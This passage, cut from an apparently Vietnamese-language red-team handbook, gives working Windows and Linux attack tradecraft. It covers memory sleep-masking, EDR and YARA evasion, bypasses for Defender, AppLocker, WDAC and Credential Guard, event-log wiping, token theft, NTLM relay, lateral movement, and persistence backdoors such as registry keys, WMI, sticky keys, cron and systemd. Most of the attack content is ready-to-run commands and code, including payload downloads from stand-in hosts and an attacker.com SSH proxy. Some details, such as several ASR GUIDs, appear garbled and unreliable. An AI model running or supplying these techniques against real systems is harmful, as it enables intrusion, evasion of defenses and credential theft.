1. **Pre-sleep:** Encrypt beacon heap, stack, và code sections.
2. **Sleep:** Beacon memory không thể đọc được.
3. **Timer:**
   - Dùng `CreateTimerQueueTimer` để tạo timer.
   - Khi timer fires → decrypt memory, call check-in, re-encrypt.
4. **No threads:** Timer callback không tạo thread mới.

```c
// Ekko sleep pseudo-code
void EkkoSleep(DWORD milliseconds) {
    // 1. Save context
    CONTEXT ctx = {0};
    RtlCaptureContext(&ctx);
    
    // 2. Encrypt beacon sections
    for each (section in beacon_code) {
        EncryptSection(section);
    }
    
    // 3. Create timer
    HANDLE timerQueue = CreateTimerQueue();
    HANDLE timer = NULL;
    
    // 4. Wait for timer
    CreateTimerQueueTimer(&timer, timerQueue, ...);
    WaitForSingleObject(...);
    
    // 5. Decrypt on wake
    for each (section in beacon_code) {
        DecryptSection(section);
    }
    
    // 6. Restore context
    RtlRestoreContext(&ctx, NULL);
}
```

#### Gargoyle Technique

**Gargoyle** dùng hardware breakpoints để ẩn code khi không chạy:

```
1. Set memory region PAGE_NOACCESS.
2. When execution access → page fault.
3. Page fault handler tạm thời decrypt code.
4. Tiếp tục execution.
5. After execution → re-encrypt, set PAGE_NOACCESS lại.
```

#### Barker Technique

**Barker** tương tự Ekko nhưng dùng `NtWaitForSingleObject` và APC:

```
1. Pre-sleep: Encrypt memory, set hardware breakpoints.
2. Dùng NtWaitForSingleObject với alertable wait.
3. Timer queue fires → decrypt memory.
4. Execute check-in via APC queue (QueueUserAPC).
5. Re-encrypt memory.
```

### 10. BOFs for In-Memory Evasion

**Beacon Object Files (BOFs)** là cách execute code in-memory không touch disk, không cần spawn process mới.

**BOF Execution Flow:**
1. Teamserver compile C/C++ code → .o file (COFF object).
2. Send to beacon via C2 channel.
3. Beacon loader parse COFF header, resolve imports, relocate.
4. Execute in beacon's process memory.
5. Return output to teamserver.

**Evasion Advantages:**
- No disk write.
- No process creation.
- No DLL loading (trừ ntdll).
- Small footprint (KB scale).
- Can use direct syscalls.
- Can patch AMSI/ETW inline.

**Popular Evasion BOFs:**
- **BOF.NET:** Host .NET runtime in beacon, execute C# assemblies.
- **execute-assembly:** Classic .NET execution.
- **inline-execute:** BOF to execute other BOFs.
- **nanodump:** Mini LSASS dumper (smaller than full Mimikatz).
- **Sauerkraut:** BOF version of Mimikatz.

### 11. YARA Rule Evasion

**YARA** là pattern-matching engine dùng để identify malware. EDR dùng YARA rules để scan files và memory.

#### YARA Rule Obfuscation

```yara
rule Shellcode_Detect {
    meta:
        description = "Detects common shellcode patterns"
    strings:
        $shellcode1 = { 48 31 C0 48 31 DB 48 31 C9 48 31 D2 }
        $shellcode2 = { 90 90 90 90 90 90 90 90 90 90 }
        $api_import = "CreateRemoteThread"
    condition:
        $shellcode1 or $shellcode2 or $api_import
}
```

**Evasion Techniques:**
1. **String Obfuscation:** Encode strings, decrypt at runtime.
2. **Polymorphic Code:** Mỗi lần generate payload khác nhau.
3. **Signature Mutation:** Thay đổi instruction sequences.
4. **API Hashing:** Không dùng string imports, hash API names.
5. **Metamorphic Code:** Payload thay đổi cấu trúc nhưng giữ chức năng.
6. **Junk Code Insertion:** Thêm garbage instructions.
7. **Control Flow Flattening:** Làm rối control flow.

```c
// API hashing — tránh YARA string detection
DWORD HashString(const char* str) {
    DWORD hash = 0x1337;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

// Resolve API by hash
void* GetProcAddrByHash(DWORD hash) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    for each module in ldr->InMemoryOrderModuleList {
        // Parse export directory
        // For each export, compute hash and compare
    }
}
```

---

## E. WINDOWS DEFENSES DEEP-DIVE

### 1. Windows Defender — Microsoft Defender Antivirus

**Windows Defender** (MS Defender AV) là built-in antivirus solution trên Windows 10/11 và Server 2016+.

#### Architecture

```
┌─────────────────────────────────────────┐
│        Windows Defender Agent           │
├─────────────────────────────────────────┤
│  MpEngine.dll — Scanning Engine        │
│  ├─ Signature-based detection          │
│  ├─ Heuristic/behavioral detection     │
│  ├─ Machine Learning (cloud)           │
│  └─ Emulation layer                    │
│                                         │
│  MpOav.dll — Office AV protection      │
│  MsMpEng.exe — Main service process    │
│  NisSvc.exe — Network Inspection       │
│  SenseIR.exe — MDE sensor              │
└─────────────────────────────────────────┘
```

#### Cloud-Delivered Protection

Windows Defender có thể send samples lên cloud để ML classification:

- **Block at First Sight (BaFS):** Suspicious file bị block cho đến khi cloud analysis hoàn tất.
- **Cloud Timeout:** Nếu không có cloud connectivity trong X giây, file được allow.
- **MAPS (Microsoft Active Protection Service):** Community telemetry.

**Bypass:** Nếu defender không thể contact cloud service, nó fallback local-only scanning. Technique: block defender network access.

```powershell
# Block defender outbound
New-NetFirewallRule -DisplayName "Block Defender" -Direction Outbound -Program "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Action Block
```

#### MpEngine — Deep Dive

**MpEngine.dll** là scanning engine, có nhiều layers:
1. **SmartScreen:** File reputation check.
2. **Signature Matching:** Known malware hashes/patterns.
3. **Heuristic:** Generic detections.
4. **Behavioral Monitoring:** AMSI, ETW monitoring.
5. **Machine Learning:** Local + cloud models.
6. **ASR (Attack Surface Reduction):** Rule-based behavioral blocking.

**Bypass Techniques:**
- **Signature Evasion:** Obfuscation, encryption, custom packers.
- **Heuristic Evasion:** Modify execution flow, add junk code.
- **ML Evasion:** Train against local ML model, use adversarial inputs.
- **ASR Evasion:** Bypass specific rules (see below).

### 2. Attack Surface Reduction (ASR) Rules

**ASR rules** là 14 rules chặn common attack techniques.

| Rule # | Name | GUID | Bypass |
|---|---|---|---|
| 1 | Block Office from creating child processes | {D4F940AB-401B-4EFC-AADC-AD5F3C50688A} | Dùng WMI/Scheduled Tasks thay vì direct child process |
| 2 | Block Office from creating executable content | {3B576869-A4EC-4529-8536-B80A7769E899} | Dùng non-PE file types (JS, VBS, PowerShell) |
| 3 | Block Office from injecting into other processes | {75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84} | Dùng process hollowing từ non-Office process |
| 4 | Block Win32 API calls from Office macro | {92E97FA1-2EDF-4476-BDD6-9DD0B4DDC7B} | Dùng .NET COM objects thay vì Win32 API |
| 5 | Block all Office applications from creating child processes | {1E05C1E4-EEB7-4F3C-B1B4-3A6E6B3F9C3A} | Dùng COM-based execution |
| 6 | Block credential stealing from Windows LSA | {9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2} | Dùng LSASS dumping methods bypass ASR |
| 7 | Block executable content from email client | {BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550} | Dùng link-based delivery, không attach file |
| 8 | Block JavaScript/VBScript from launching downloaded content | {D3E037E1-3EB8-44C8-A917-57927947596D} | Dùng WSH bypass, cscript alternative |
| 9 | Block process creations from PSExec and WMI commands | {B2B3F03D-6A65-492F-8C92-0A7C8B3A1F4A} | Dùng alternative lateral movement |
| 10 | Block untrusted and unsigned processes that run from USB | {B2D3BEAB-7094-4E61-AB34-BEE6C8D9F3C8} | Sign payload with stolen cert |
| 11 | Block persistence through WMI event subscription | {E6DB77E5-3DF2-4CF1-B95A-636979351E5B} | Dùng alternative persistence mechanisms |
| 12 | Block abuse of exploited vulnerable signed drivers | {56A863A9-875E-4185-98A7-B882C64B5CE5} | Dùng kernel exploitation |
| 13 | Block use of advanced protection against ransomware | {C1DB55AB-C21A-4637-B662-EA9C3A8C6A3A} | N/A (ransomware-specific) |
| 14 | Block Adobe Reader from creating child processes | {7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C} | Dùng alternative to Adobe Reader |

### 3. Microsoft Defender for Endpoint (MDE)

**MDE** (trước đây là Defender ATP) là EDR solution của Microsoft.

#### Sensor Stack

```
┌─────────────────────────────────────────┐
│            MDE Sensor Stack             │
├─────────────────────────────────────────┤
│  Layer 1: Kernel Driver (MsSecCore.sys) │
│   - Kernel callbacks (process, thread,  │
│     image load, registry, object)       │
│   - ETW collectors                      │
│   - Mini-filter driver (file I/O)       │
├─────────────────────────────────────────┤
│  Layer 2: Userland Sensor               │
│   - AMSI integration                    │
│   - PowerShell module logging           │
│   - .NET interop monitoring             │
├─────────────────────────────────────────┤
│  Layer 3: Telemetry Service             │
│   - Data aggregation                    │
│   - Compression & encryption            │
│   - Cloud upload (SenseIR.exe)          │
├─────────────────────────────────────────┤
│  Layer 4: Cloud Backend                 │
│   - Detection pipeline                  │
│   - Automated investigation             │
│   - Threat analytics                    │
└─────────────────────────────────────────┘
```

#### Detection Pipeline

MDE có multi-stage detection pipeline:

1. **Sensor Data Collection:** All events → telemetry.
2. **Pre-processing:** Filter, aggregate, normalize events.
3. **Signature-based Detection:** Known malicious patterns.
4. **Behavioral Detection:** Alerts trên suspicious behavior chains.
5. **Machine Learning:** Cloud ML models classify events.
6. **Automated Investigation:** Triggers khi alert fired.
7. **Response:** Isolation, process kill, remediation.

**MDE Bypass Challenges:**
- Kernel callbacks không bypass được từ userland.
- Cloud ML detection có thể phát hiện TTPs dù code obfuscated.
- Automated investigation có thể correlation nhiều events → phát hiện campaign.

**Potential Gaps:**
- **Memory-only attacks:** Nếu không touch disk, MDE sensor có thể miss.
- **BOF execution:** In-memory, short-lived → khó catch.
- **Reflective loading:** Manual map DLL, không qua LoadLibrary.
- **Native API abuse:** Dùng direct syscalls bỏ qua userland hooks.

### 4. Windows Event Logging & Tampering

#### Sysmon (System Monitor)

**Sysmon** là Microsoft Sysinternals tool log system activity chi tiết.

**Event IDs quan trọng với red team:**

| Event ID | Name | Red Team Relevance |
|---|---|---|
| 1 | Process Creation | Detect process spawn từ office/script |
| 3 | Network Connection | Detect C2 beacon outbound |
| 7 | Image Loaded | Detect DLL injection |
| 8 | CreateRemoteThread | Detect cross-process injection |
| 10 | Process Access | Detect LSASS access (Mimikatz) |
| 11 | File Create | Detect dropped malware |
| 13 | Registry Value Set | Detect persistence registry |
| 15 | FileCreateStreamHash | Detect NTFS ADS |
| 17 | Pipe Event | Detect SMB/Named Pipe C2 |
| 18 | Pipe Connected | Detect pipe connection |
| 22 | DNSEvent | Detect DNS queries |

**Sysmon Evasion:**
- Dùng `process access filtering` để block Sysmon từ monitoring certain processes.
- Sysmon cấu hình có thể exclude processes: `-d` filter.
- DNS queries có thể bypass với custom DNS resolver.
- Network connections từ trusted processes ít bị log.

#### EventLog Tampering

**Clear EventLog:**
```powershell
# Clear Security log
Clear-EventLog -LogName Security

# Wevtutil
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

**Disable EventLog:**
```powershell
# Disable Security log
wevtutil sl Security /e:false

# Registry disable
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "Start" -Value 4
```

**Source → Null:** Redirect event log source to null device:
```powershell
# Ghi log đến /dev/null
$null | Out-File -FilePath "C:\Windows\System32\winevt\Logs\Security.evtx"
```

**Selective Log Deletion:**
```c
// Delete specific events bằng EventLog API
EVT_HANDLE hLog = EvtOpenLog(NULL, L"Security", EvtOpenChannelPath);
EVT_HANDLE hQuery = EvtQuery(NULL, L"Security", L"*[System[(EventID=4688)]]", ...);
EVT_HANDLE hEvent;
while (EvtNext(hQuery, 1, &hEvent, INFINITE, 0, NULL)) {
    EvtArchiveExportedLog(hLog, L"backup.evtx", ...);
    // Hoặc dùng NtDeleteKey trên registry event log keys
}
```

### 5. AppLocker / WDAC Bypass

#### AppLocker

**AppLocker** là application whitelisting solution cho phép/quản lý execution policies.

**Default Rules:**
- **Executable:** Allow %PROGRAMFILES%, %WINDIR%, %TEMP% (với admin).
- **Windows Installer:** Allow signed .msi.
- **Script:** Allow signed scripts, %WINDIR%.
- **Packaged Apps:** All signed store apps.

**Bypass Techniques:**

1. **CPL (Control Panel):**
```powershell
# Exec code through CPL
rundll32.exe shell32.dll,Control_RunDLL payload.cpl
```

2. **regsvr32:** 
```cmd
# Regsvr32 bypass (Squiblydoo)
regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll
```

3. **mshta:**
```cmd
# MSHTA bypass
mshta.exe http://example.com/payload.hta
```

4. **rundll32:**
```cmd
# Rundll32 execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://example.com/payload")
```

5. **cscript/wscript:**
```cmd
# If scripts allowed
cscript.exe /E:JScript encoded_payload.js
```

6. **InstallUtil:**
```cmd
# .NET InstallUtil bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U payload.exe
```

7. **MSBuild:**
```cmd
# MSBuild bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

#### WDAC (Windows Defender Application Control) / Device Guard

**WDAC** là application control policy mạnh hơn AppLocker, chạy ở kernel level.

**WDAC Policies:**
- **Allow all** (default).
- **Deny by publisher:** Chỉ allow signed by trusted publishers.
- **Deny by hash:** Chỉ allow specific binaries.
- **Managed Installer:** Allow binaries installed by managed installer.
- **Intelligent Security Graph (ISG):** Allow binaries with good reputation.

**Bypass:**
- **Managed Installer Bypass:** Nếu AppLocker managed installer rule enabled, copy payload bằng MSI installer.
- **WDAC Signed Bypass:** Sign payload với stolen/acquired code signing cert.
- **Kernel Exploit:** Disable WDAC driver (CI.dll patching).
- **Boot Configuration:** `bcdedit /set hypervisorlaunchtype off` (nếu không có Secure Boot).
- **Memory-only:** Execute payload từ memory không touch disk.

#### PowerShell Constrained Language Mode (CLM) Bypass

**CLM** restricts PowerShell to a subset của .NET types. Chỉ cho phép types marked với `*` attributes.

**CLM Bypass Techniques:**

1. **Registry Change:**
```powershell
# If SYSTEMLanguage != ConstrainedLanguage
Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell -Name ExecutionPolicy -Value Unrestricted
```

2. **Reflection Bypass:**
```powershell
# Dùng reflection để bypass CLM
$method = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetMethod('GetBypassResult', [Reflection.BindingFlags] 'NonPublic,Static')
$method.Invoke($null, $null)
```

3. **Runspace Construction:**
```powershell
# Create custom runspace without CLM
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript("$FullLanguageCode").Invoke()
```

### 6. Windows Credential Guard (VSM)

**Credential Guard** dùng Virtualization-based Security (VBS) để protect LSA secrets.

**Kiến trúc:**
```
[Normal World]                    [Secure World (VSM)]
┌──────────────┐                  ┌──────────────────┐
│ LSASS.exe    │ ←─ IPC ──→      │ lsaiso.exe       │
│ (dumping     │                  │ (secure process) │
│  bị blocked) │                  │ NTLM, Kerberos   │
└──────────────┘                  │ keys stored here │
                                  └──────────────────┘
```

**Bypass Techniques:**
1. **Registry Disable:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "RunAsPPL" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
```
Requires reboot.

2. **Disable via Kernel:**
- Load kernel driver → patch g_CbpEnabled flag.
- Disable Secure Kernel.

3. **Direct Memory Dump:**
- Read LSA isolator process memory (lsaiso.exe physical memory).
- Dùng DMA attacks (FireWire, Thunderbolt).

4. **WDigest Downgrade:**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
Yêu cầu user login lại.

5. **Internal Monologue:** Dùng SSP (Security Support Provider) để capture credentials.

### 7. Windows Firewall Logging & Bypass

**Windows Firewall** (WF.msc) có thể log dropped/inbound/outbound connections.

**Bypass:**
1. **Firewall Rules Manipulation:**
```powershell
# Add rule to allow outbound C2
New-NetFirewallRule -DisplayName "Allow C2" -Direction Outbound -Protocol TCP -LocalPort 443 -Action Allow
```

2. **Disable Firewall:**
```powershell
# Disable all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

3. **Port Exhaustion:** Dùng ports normally allowed (443, 80, 53).
4. **Trusted Process:** Dùng process được allow (svchost, lsass, etc).
5. **DLL Sideloading:** Inject vào trusted process.
6. **Named Pipes:** Bypass firewall hoàn toàn vì named pipes là local IPC.

---

## F. POST-EXPLOITATION & LATERAL MOVEMENT

### 1. Token Manipulation

**Access Tokens** là objects chứa security context của process/thread. Gồm SID, privileges, groups.

#### Steal Token

Lấy token từ process khác (thường là high-integrity process):

```c
// Steal token từ SYSTEM process
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken);

// Duplicate token
HANDLE hDupToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);

// Create process with stolen token
CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL, cmd, ...);
```

**Cobalt Strike:**
```
beacon> steal_token 1234
beacon> rev2self    # Revert to original token
```

#### Make Token

Tạo token từ credentials:

```c
// Make token từ username/password/domain
HANDLE hToken;
LogonUserW(L"username", L"DOMAIN", L"password", 
           LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
ImpersonateLoggedOnUser(hToken);
```

**Cobalt Strike:**
```
beacon> make_token DOMAIN\user password
```

#### Token Impersonation

**Impersonation Levels:**
- SecurityAnonymous: Không impersonate.
- SecurityIdentification: Check SID, không access.
- SecurityImpersonation: Server impersonate client locally.
- SecurityDelegation: Server impersonate client remotely.

```c
// Set thread impersonation
ImpersonateLoggedOnUser(hToken);
// Or
SetThreadToken(NULL, hToken);
```

### 2. NTLM Relay Advanced

**NTLM Relay:** Intercept NTLM authentication và relay đến target server để authenticate.

**Tool: Impacket's ntlmrelayx**

```bash
# Basic relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to LDAP (for ADCS abuse)
impacket-ntlmrelayx -t ldap://dc.domain.com --escalate-user domainadmin

# Relay to HTTP
impacket-ntlmrelayx -t http://target.com/ -smb2support
```

**NTLM Relay Chain:**
```
[Victim] → HTTP → [Attacker (Relay)] → [Target SMB/LDAP/HTTP]
```

**Advanced Techniques:**
- **Cross-Protocol Relay:** HTTP → SMB, SMB → LDAP, HTTP → LDAP.
- **Resource-Based Constrained Delegation (RBCD):** Kết hợp relay + RBCD.
- **ADCS (Active Directory Certificate Services) Escalation:** Relay NTLM đến ADCS Web Enrollment → get certificate → authenticate as victim.

### 3. Remote Execution Methods

#### PsExec

**PsExec** (Sysinternals) — Dùng SVC$ admin share + Service Control Manager.

```
1. Copy payload to ADMIN$ share.
2. Create service trên remote machine.
3. Start service → execute payload.
4. Remove service và file.
```

**Cơ chế:**
- Dùng ADMIN$ share (C:\Windows).
- Tạo service với `CreateService` → `StartService`.
- Service chạy code như SYSTEM.

**Detection:** Event ID 7045 (service install), 4688 process creation, SMB file writes.

**Impacket PsExec:**
```bash
impacket-psexec domain/user:pass@target cmd.exe
# Or pass-the-hash
impacket-psexec -hashes LM:HASH domain/user@target cmd.exe
```

#### WMI (Windows Management Instrumentation)

**WMI Execution:** Dùng Win32_Process.Create method.

```powershell
# WMI process creation
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName TARGET
```

```cmd
# wmic
wmic /node:TARGET process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

**WMI Event Subscription:** Create permanent WMI event filter + consumer → execute on event.

```powershell
# WMI event subscription persistence
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name="MyFilter"
    EventNamespace='root\cimv2'
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name="MyConsumer"
    CommandLineTemplate="powershell.exe -Exec Bypass -C IEX( ... )"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}
```

#### WinRM (Windows Remote Management)

**WinRM Execution:** Dùng PowerShell remoting.

```powershell
# WinRM execution
$s = New-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -Session $s -ScriptBlock { whoami }
```

```cmd
# winrs
winrs -r:TARGET cmd /c whoami
```

**Default:** Port 5985 (HTTP) / 5986 (HTTPS).

#### DCOM (Distributed Component Object Model)

**DCOM Execution:** Dùng COM objects để execute trên remote machine.

```powershell
# MMC20.Application — classic lateral movement
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "Minimized")
```

**Other DCOM Objects:**
- `ShellWindows` / `ShellBrowserWindow`
- `Excel.Application` / `Word.Application`
- `Visio.Application`
- `Outlook.Application`
- `XboxGameCallableUI`

#### SchTasks — Scheduled Tasks

```cmd
# Create and run scheduled task remotely
schtasks /create /S TARGET /TN "MyTask" /TR "powershell -c IEX(...)" /SC ONCE /ST 00:00 /RU SYSTEM
schtasks /run /S TARGET /TN "MyTask"
schtasks /delete /S TARGET /TN "MyTask" /F
```

#### SCCM (System Center Configuration Manager)

**SCCM Abuse:** Nếu có rights, có thể:
1. Client push installation → distribute malware.
2. Application deployment → execute MSI/script trên endpoints.
3. Script deployment → run PowerShell script.
4. Software inventory → discover software/patches.
5. Hardware inventory → OS, IP, services info.
6. CMPivot queries → real-time data collection.

**Tools:** SharpSCCM, SCCMWHore.

### 4. SSH Hijacking & Agent Forwarding

#### SSH Agent Forwarding Abuse

**Agent Forwarding:** SSH client forwards authentication agent to server → server can connect to other servers as user.

**Attack:**
1. Compromise user's machine.
2. Read SSH agent socket (SSH_AUTH_SOCK) hoặc keys.
3. Use agent forwarding socket → authenticate to other servers as user.

```bash
# Find SSH agent socket
ls -la /tmp/ssh-*/agent.*

# Use agent
SSH_AUTH_SOCK=/tmp/ssh-xxxxx/agent.xxxx ssh user@target
```

#### SSH Key Extraction

```bash
# Find SSH private keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
grep -r "BEGIN OPENSSH PRIVATE KEY" /home/ 2>/dev/null
grep -r "BEGIN RSA PRIVATE KEY" /home/ 2>/dev/null
```

#### SSH Persistence

```bash
# Add public key to authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH config backconnect
# ~/.ssh/config
Host *.domain.com
    ProxyCommand nc -x attacker.com:1080 %h %p
```

### 5. RDP Session Hijacking

**RDP Session Hijacking:** Steal another user's RDP session.

```cmd
# Query existing sessions
query user /server:TARGET

# Connect to session without password
tscon.exe SESSION_ID /dest:console

# Or use Mimikatz
mimikatz ts::sessions
mimikatz ts::remote SESSION_ID
```

**Detection:** Event ID 4778 (session reconnected), 4779 (session disconnected).

---

## G. PERSISTENCE & PRIVILEGE ESCALATION WINDOWS

### 1. Standard Persistence Mechanisms

#### Registry Run Keys

```powershell
# Current User (HKCU)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\path\to\payload.exe"

# All Users (HKLM) — requires admin
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\path\to\payload.exe"

# Startup folder
$startup = [Environment]::GetFolderPath('Startup')
New-Item -Path "$startup\payload.url" -ItemType File
# Or copy EXE to startup
Copy-Item payload.exe "$startup\payload.exe"
```

#### Scheduled Tasks

```cmd
# Task with SYSTEM privileges (every 5 minutes)
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc minute /mo 5 /ru SYSTEM /f

# One-time on logon
schtasks /create /tn "OneDriveSync" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM /f

# On event (Event ID 4624 = logon)
schtasks /create /tn "LogonTrigger" /tr "C:\payload.exe" /sc onevent /ec Security /mo "*[System[(EventID=4624)]]" /ru SYSTEM
```

#### WMI Event Subscription

```powershell
# WMI persistence — execute on startup
$filterArgs = @{
    Name = 'StartupFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'StartupConsumer'
    CommandLineTemplate = "C:\payload.exe"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

#### DLL Search Order Hijacking

**Search Order:** Application directory → %PATH% → System32 → SysWOW64.

**Hijacking:**
1. Find app that loads missing DLL.
2. Place malicious DLL in app directory.
3. App loads malicious DLL instead.

```powershell
# Find missing DLL
# Procmon filter: Process Name = target.exe, Operation = CreateFile, Path ends with .dll, Result = NAME NOT FOUND
```

#### COM Hijacking

**COM (Component Object Model)** hijacking exploits CLSID registry lookup.

```powershell
# Find COM objects with unquoted path or writable registry
# Replace CLSID's InprocServer32 with malicious DLL
$path = "HKLM:\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32"
Set-ItemProperty -Path $path -Name "(default)" -Value "C:\malicious.dll"
```

### 2. Advanced Persistence

#### Netsh Helper DLL

```cmd
# Register helper DLL in netsh
netsh add helper C:\path\to\malicious.dll
```

**Detection:** HKLM\Software\Microsoft\NetSh.

#### Bitvise SSH Backdoor

Bitvise SSH Server có thể install as service với custom port — tạo persistent backdoor.

#### Sticky Keys / Utilman / Sethc

**Sticky Keys:** Replace sethc.exe (Sticky Keys binary) với cmd.exe.

```cmd
# At boot from PE or through recovery
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# On login screen → press Shift 5 times → gets SYSTEM cmd
```

**Utilman:** Replace utilman.exe (Ease of Access) tương tự.

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Win+U at login screen → SYSTEM cmd
```

#### Image File Execution Options (IFEO)

**Debugger Key:** Run specified binary when target binary starts.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\payload.exe"
```

**SilentProcessExit:** Similar but uses GlobalFlag + ReportingMode.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\payload.exe"
```

#### Accessibility Tools Backdoor

Tất cả accessibility tools (sethc, utilman, narrator, magnify, osk, disp) đều có thể replaced với cmd.exe.

#### Bootkit Level Persistence

**Bootkit:** Infect boot process → load before Windows → kernel-level persistence.

**Examples:**
- **Carberp:** MBR bootkit.
- **Stoned Bootkit:** MBR/VBR (Volume Boot Record).
- **ESP (EFI System Partition) Backdoor:** Replace Windows bootloader.
- **Shim Bootkit:** Modify UEFI firmware.

---

## H. PERSISTENCE & PRIVESC LINUX

### 1. Cron — The Classic

```bash
# User crontab — persist as current user
(crontab -l 2>/dev/null; echo "*/5 * * * * /path/to/payload") | crontab -

# System crontab — requires root
echo "*/5 * * * * root /path/to/payload" >> /etc/crontab

# Cron.d directory — cleaner
echo "*/5 * * * * root /path/to/payload" > /etc/cron.d/backdoor
chmod 644 /etc/cron.d/backdoor
```

**Cron Bypass Detection:**
- Use Cron's @reboot directive for boot persistence.
- Cryptic cron names (mimic system services).

### 2. Systemd — Modern Linux

```ini
# /etc/systemd/system/backdoor.service
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/path/to/payload
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

```bash
# Enable service
systemctl enable backdoor.service
systemctl start backdoor.service

# User systemd (no root)
mkdir -p ~/.config/systemd/user/
# Create service in user directory
systemctl --user enable backdoor.service
```

### 3. SSH Authorized Keys

```bash
# Add public key
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH config backdoor — reverse shell connect back
# ~/.ssh/config
Host *
    ProxyCommand /path/to/payload

# AuthorizedKeysCommand — custom key verification script (if configured)
# /etc/ssh/sshd_config:
# AuthorizedKeysCommand /path/to/script.sh
# AuthorizedKeysCommandUser nobody
```

### 4. SUID/Capability Abuse

#### SUID Persistence

```bash
# Set SUID bit on payload
chmod u+s /path/to/payload

# Or set SUID on common binary — exploited for privesc
chmod u+s $(which find)
find . -exec /bin/bash -p \;  # -p preserves SUID
```

#### Capabilities

```bash
# Set CAP_SETUID capability
setcap cap_setuid+ep /path/to/payload

# Abuse capabilities on Python/perl/node
setcap cap_setuid+ep /usr/bin/python3
# Python script can now setuid(0)
```

### 5. LD_PRELOAD / LD_LIBRARY_PATH

**LD_PRELOAD:** Load shared library before all others — function hooking.

```c
// malicious.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

// Hook write() — spawn shell
ssize_t write(int fd, const void *buf, size_t count) {
    setuid(0);
    system("id >> /tmp/exploit");
    // Forward to real write
